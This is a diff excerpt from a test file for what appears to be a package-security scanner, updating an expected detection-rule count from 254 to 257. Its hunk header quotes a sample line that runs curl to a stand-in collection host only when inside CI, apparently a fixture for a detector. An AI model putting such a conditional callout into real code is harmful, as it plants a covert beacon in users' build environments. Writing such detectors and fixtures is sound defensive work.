@@ -315,11 +315,11 @@ if (isCI) { require('child_process').exec('curl http://collect.example.com/ci');
   // Rule count verification
   // =========================================================================
 
-  test('v8b: rule count is 259 (254 RULES + 5 PARANOID, PYPI-003 pypi_release_zero: +1 rule)', () => {
+  test('v8b: rule count is 262 (257 RULES + 5 PARANOID, Track D +3 rules)', () => {
     const { RULES, PARANOID_RULES } = require('../../src/rules/index.js');
     const ruleCount = Object.keys(RULES).length;
     const paranoidCount = Object.keys(PARANOID_RULES).length;
-    assert(ruleCount === 254, `Expected 254 RULES, got ${ruleCount}`);
+    assert(ruleCount === 257, `Expected 257 RULES, got ${ruleCount}`);
     assert(paranoidCount === 5, `Expected 5 PARANOID, got ${paranoidCount}`);
   });
 }
